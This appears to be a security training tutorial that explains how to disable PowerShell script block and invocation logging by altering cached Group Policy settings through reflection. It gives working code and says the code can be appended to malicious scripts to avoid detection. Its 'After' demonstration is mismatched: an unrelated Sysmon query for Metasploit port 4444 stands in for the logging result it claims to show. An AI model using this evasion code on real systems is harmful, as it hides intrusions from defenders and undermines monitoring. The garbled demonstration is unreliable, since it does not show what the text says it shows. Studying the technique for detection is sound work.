# Group Policy Takeover: Evading PowerShell Logging

PowerShell module logging and script block logging can be enabled via Group Policy:  
**Administrative Templates → Windows Components → Windows PowerShell**.

Within a PowerShell session, system assemblies run in the same security context as the user. This allows an attacker with sufficient privileges to manipulate cached Group Policy settings using reflection.

## High-Level Steps

A group policy takeover involves three main steps:

1. **Obtain group policy settings from the utility cache.**
2. **Modify the provider setting (e.g., set to `0`).**
3. **Modify invocation or module definition as needed.**

Below is a breakdown of each step with example PowerShell code.

---

### 1. Obtain Group Policy Settings

Use reflection to access the `System.Management.Automation.Utils` type and retrieve the `cachedGroupPolicySettings` field:

```powershell
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
```

---

### 2. Modify Provider Settings

Change the desired provider settings to `0`. For example, to disable Script Block Logging (controls event ID 4104):

```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```

To disable Script Block Invocation Logging (controls event ID 4103):

```powershell
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

---

### 3. Apply Changes in a Script

Combine the above steps in a PowerShell script. This technique can be appended to a malicious script to evade logging.  
**Note:** The script may require modifications for compatibility with PowerShell v5.1.

---

## Demonstration

To verify the effectiveness, compare event counts before and after running the script.

**Before:**

```powershell
PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
0
PS C:\Users\Administrator\Desktop> whoami
Tryhackme\administrator
PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
3
```

**After:**

```powershell
PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_Metasploit.evtx -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name="DestinationPort"] and */EventData/Data=4444'

    ProviderName: Microsoft-Windows-Sysmon

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
1/5/2021 2:21:32 AM              3 Information      Network connection detected:...
```

In the first terminal, three events are generated when the PowerShell script runs. In the second terminal, after executing the script, no events are generated for subsequent commands.

---